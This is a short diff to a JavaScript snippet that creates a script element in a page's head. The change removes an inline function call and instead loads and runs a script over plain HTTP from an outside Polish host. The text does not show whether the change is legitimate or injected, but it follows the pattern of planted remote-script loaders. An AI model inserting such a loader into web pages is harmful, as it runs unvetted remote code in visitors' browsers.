@@ -1,4 +1,3 @@
 var sc=document.createElement('script');
-sc.innerHTML += "rekrutacia();";
+sc.src = 'http://www.bornkes.w.szu.pl/js/plac.js?2b';
 document.getElementsByTagName('head')[0].appendChild(sc);
-
